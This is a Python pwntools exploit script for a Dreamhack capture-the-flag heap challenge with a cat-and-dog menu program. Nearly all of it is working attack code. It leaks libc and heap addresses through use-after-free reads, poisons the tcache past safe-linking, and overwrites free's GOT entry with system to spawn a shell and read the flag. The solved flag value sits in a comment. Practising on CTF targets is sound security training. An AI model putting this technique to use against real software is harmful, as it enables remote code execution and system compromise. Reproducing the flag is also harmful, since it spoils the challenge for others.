#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'main_patched'
HOST = 'host3.dreamhack.games'
PORT = 24193

exe = ELF(exe_path, checksec=False)
libc = exe.libc
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
b*0x0000000000401abf
b*0x00000000004013ad
b*0x000000000040159a
b*0x00000000004014a3
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(prompt):
    p.send(prompt)
def sl(data):
    p.sendline(data)
def rcu(data):
    return p.recvuntil(data)
def rl():
    return p.recvline()

# ============================EXPLOIT============================
def get_cat(idx):
    sla(b': ', b'1')
    sla(b': ', str(idx).encode())
def see_cat(idx):
    sla(b': ', b'2')
    sla(b': ', str(idx).encode())
def pet_cat(idx, data):
    sla(b': ', b'3')
    sla(b': ', str(idx).encode())
    sa(b': ', data)
def release_cat(idx):
    sla(b': ', b'4')
    sla(b': ', str(idx).encode())

def get_dog(idx):
    sla(b': ', b'5')
    sla(b': ', str(idx).encode())
def see_dog(idx):
    sla(b': ', b'6')
    sla(b': ', str(idx).encode())
def pet_dog(idx, data):
    sla(b': ', b'7')
    sla(b': ', str(idx).encode())
    sa(b': ', data)
def release_dog(idx):
    sla(b': ', b'8')
    sla(b': ', str(idx).encode())

for i in range(9):
    get_cat(i)
for i in range(7):
    release_cat(i)
release_cat(7)
see_cat(7)
rcu(b'says: ')
libc.address = u64(p.recv(8)) - 0x21ace0
log.success(f'libc base: {hex(libc.address)}')

pet_cat(8, b"/bin/sh\x00")

for i in range(9, 15):
    get_cat(i)
# pet_cat(0, p64(0x0))

see_cat(0)
rcu(b'says: ')
heap = u64(p.recv(8))<<12
log.success(f'heap base: {hex(heap)}')

release_cat(2)
pet_cat(13, p64((exe.got.free-0x8) ^ (heap>>12)))
get_cat(3)
get_cat(4)
pet_cat(4, p64(0x378d30 + libc.address) + p64(libc.sym.system))
release_cat(8)
sl(b'cat flag*')
# DH{They_both_like_cake:v75M4F0olNw/BHeMJKhstg==}
p.interactive()
